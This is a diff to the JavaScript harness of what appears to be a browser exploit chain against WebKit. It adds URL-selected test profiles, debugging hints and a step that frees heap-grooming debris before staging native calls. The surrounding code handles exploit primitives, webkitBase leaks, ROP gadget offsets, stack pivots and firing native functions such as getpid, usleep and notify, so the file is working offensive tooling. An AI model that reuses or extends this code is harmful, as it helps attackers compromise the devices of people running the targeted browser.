@@ -88,7 +88,48 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830bs";
+const BUILD_ID = "rw-20250831b";
+
+/** Notify bisect URL profiles — applied by Reload profile button. */
+const NOTIFY_PROFILES = {
+    default: {
+        label: "default",
+        qs: { freshprep: "1", native: "notify" },
+    },
+    "test-a": {
+        label: "Test A usleep",
+        qs: { freshprep: "1", native: "notify", notifysmoke: "usleep" },
+    },
+    "test-b": {
+        label: "Test B bisect",
+        qs: { freshprep: "1", native: "notify", notifybisect: "1" },
+    },
+    "test-ab": {
+        label: "Test A+B",
+        qs: { freshprep: "1", native: "notify", notifysmoke: "usleep", notifybisect: "1" },
+    },
+    "test-c": {
+        label: "Test C gd",
+        qs: { freshprep: "1", native: "notify" },
+        needsGd: true,
+    },
+    notifydirect: {
+        label: "notifydirect",
+        qs: { freshprep: "1", native: "notify", notifydirect: "1" },
+    },
+    notifystr: {
+        label: "notifystr",
+        qs: { freshprep: "1", native: "notify", notifystr: "1" },
+    },
+    "smoke-prep": {
+        label: "smoke prep",
+        qs: { freshprep: "1", native: "smoke" },
+    },
+};
+
+const NOTIFY_PROFILE_KEYS = [
+    "notifysmoke", "notifybisect", "notifydirect", "notifystr", "gd",
+];
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid — hook cell+0x30 default (13.52; ?hook=cell for poops +0)" },
@@ -4626,7 +4667,13 @@ function bisectRunPoopsFire(p, off, hookOffs, tag) {
 }
 
 function requireNativePrep() {
-    if (!nativePrep) throw new Error("run N1 prep first");
+    if (nativePrep) return;
+    const nm = getNativeMode();
+    if (nm === "notify") {
+        throw new Error("no expm1 slab — notify mode skips prep @ Start. "
+            + "N0 bisect needs smoke/getpid in dropdown BEFORE Start + reload, or N1 (heavy, often OOMs)");
+    }
+    throw new Error("no prep — Start in smoke/getpid mode (PREP-PIN @ Start) or tap N1");
 }
 
 function pivotObjForPrep(carrier, prep) {
@@ -4821,9 +4868,19 @@ function runNativeBisectStep(stepId) {
                 }
                 mark("BISECT-OK", "N1 reuse @ Start wb=" + nativePrep.webkitBase
                     + " S=" + nativePrep.M.S + " (skip N1 — prep pinned @ PRIMITIVE-OK)");
-                state("N1 skipped — use N2", "ok");
+                state("N1 skipped — use N2 or N0", "ok");
                 break;
             }
+            if (getNativeMode() === "notify") {
+                bisectLog("BISECT-WARN", "N1 in notify mode — late prep after notify/cal eats heap; "
+                    + "reload with native=smoke BEFORE Start");
+            }
+            try {
+                if (exploit && exploit.trimExploitDebris) {
+                    exploit.trimExploitDebris();
+                    bisectLog("BISECT-TRIM", "groom freed before N1");
+                }
+            } catch (_) { }
             nativePrep = null;
             ensureNativePrep(p, off);
             pinNativeRetain();
@@ -5407,6 +5464,7 @@ async function loadExploit() {
     const core = await import("./core.js");
     exploit = {
         establishPrimitive: core.establishPrimitive,
+        trimExploitDebris: core.trimExploitDebris,
         installWindowP,
     };
     return exploit;
@@ -5605,12 +5663,21 @@ async function runStart() {
             mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
         }
         renderOut();
-        mark("HINT", "Accept fn → Fire notify (collator pinned @ Start)");
+        const nmHint = getNativeMode();
+        if (nmHint === "notify") {
+            mark("HINT", "notify mode — Fire notify OR bisect N0 needs ?native=smoke before Start");
+            state("primitive OK — Accept fn → Fire notify", "ok");
+        } else if (nmHint === "smoke" || nmHint === "getpid") {
+            mark("HINT", "PREP-PIN @ Start — skip N1, Verify pivot, bisect N2→N0");
+            state("primitive OK — Accept fn → bisect or Fire", "ok");
+        } else {
+            mark("HINT", "set native mode (notify/smoke/getpid) then Accept fn");
+            state("primitive OK", "ok");
+        }
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
         ready = true;
         ensureUiVisible();
-        state("primitive OK — 2e lk then Fire notify", "ok");
     } catch (err) {
         state("failed: " + err.message, "bad");
         mark("ERROR", err.stack || err.message);
@@ -5640,6 +5707,69 @@ function wireClick(el, fn) {
         } catch (err) {
             reportErr(err);
         }
+    });
+}
+
+function wireNotifyProfileBar() {
+    const sel = $("notify-profile");
+    const gdIn = $("notify-gd");
+    const btn = $("btn-notify-reload");
+    if (!sel || !btn) return;
+
+    function detectProfileFromUrl() {
+        const smoke = params.get("notifysmoke");
+        const bisect = params.get("notifybisect");
+        const direct = params.get("notifydirect");
+        const nstr = params.get("notifystr");
+        const gd = params.get("gd");
+        const nat = params.get("native") || getNativeMode();
+        if (nat === "smoke" && params.get("freshprep") === "1" && !smoke && !bisect)
+            return "smoke-prep";
+        if (smoke === "usleep" && bisect === "1") return "test-ab";
+        if (smoke === "usleep") return "test-a";
+        if (bisect === "1") return "test-b";
+        if (gd) return "test-c";
+        if (direct === "1") return "notifydirect";
+        if (nstr === "1") return "notifystr";
+        return "default";
+    }
+
+    function syncGdField() {
+        if (!gdIn) return;
+        const fromUrl = params.get("gd");
+        if (fromUrl && !gdIn.value)
+            gdIn.value = "0x" + String(fromUrl).replace(/^0x/i, "");
+        if (!gdIn.value) gdIn.value = "0x1d6fa";
+        gdIn.style.display = sel.value === "test-c" ? "" : "none";
+    }
+
+    sel.value = detectProfileFromUrl();
+    syncGdField();
+    sel.addEventListener("change", syncGdField);
+
+    btn.addEventListener("click", function () {
+        const key = sel.value || "default";
+        const prof = NOTIFY_PROFILES[key] || NOTIFY_PROFILES.default;
+        const u = new URL(location.href);
+        u.search = "";
+        u.searchParams.set("v", BUILD_ID);
+        const qs = prof.qs || {};
+        for (const k in qs) {
+            if (qs[k] != null && qs[k] !== "")
+                u.searchParams.set(k, qs[k]);
+        }
+        for (let i = 0; i < NOTIFY_PROFILE_KEYS.length; i++) {
+            const pk = NOTIFY_PROFILE_KEYS[i];
+            if (!(pk in qs) && pk !== "gd")
+                u.searchParams.delete(pk);
+        }
+        if (prof.needsGd && gdIn && gdIn.value.trim()) {
+            u.searchParams.set("gd", gdIn.value.trim().replace(/^0x/i, ""));
+        }
+        mark("NOTIFY-RELOAD", u.pathname + "?" + u.searchParams.toString());
+        renderOut();
+        try { crashLog.flushSync(); } catch (_) { }
+        location.href = u.pathname + "?" + u.searchParams.toString();
     });
 }
 
@@ -5679,6 +5809,7 @@ function init() {
     wireGadgetBars();
     wireG5Bar();
     wireNativeBisectBar();
+    wireNotifyProfileBar();
     ensureUiVisible();
     wireClick(btnStart, function () { return runStart(); });
     wireClick(btnSaveBases, saveBasesManual);
@@ -5710,10 +5841,14 @@ function init() {
     });
 
     if (nativeModeSel) {
-        try {
-            const saved = sessionStorage.getItem(SS_NATIVE_MODE);
-            if (saved) nativeModeSel.value = saved;
-        } catch (_) { }
+        const nativeParam = params.get("native");
+        if (nativeParam) setNativeMode(nativeParam);
+        else {
+            try {
+                const saved = sessionStorage.getItem(SS_NATIVE_MODE);
+                if (saved) nativeModeSel.value = saved;
+            } catch (_) { }
+        }
         nativeModeSel.addEventListener("change", function () {
             setNativeMode(nativeModeSel.value);
             mark("NATIVE-MODE", getNativeMode());
@@ -5771,6 +5906,15 @@ function init() {
 
     crashLog.startAutoFlush();
     mark("BOOT", "build=" + BUILD_ID + " — logs persist across reload/crash");
+    const np = params.get("notifysmoke");
+    const nb = params.get("notifybisect");
+    const ngd = params.get("gd");
+    if (np || nb || ngd || params.get("notifydirect") === "1")
+        mark("BOOT", "notify profile"
+            + (np ? " smoke=" + np : "")
+            + (nb ? " bisect=1" : "")
+            + (ngd ? " gd=0x" + ngd : "")
+            + (params.get("notifydirect") === "1" ? " direct=1" : ""));
     mark("BOOT", "LK-PROBE line shows dynamic parse status");
     mark("BOOT", groomBootLine(params));
     replayHuntTrace();
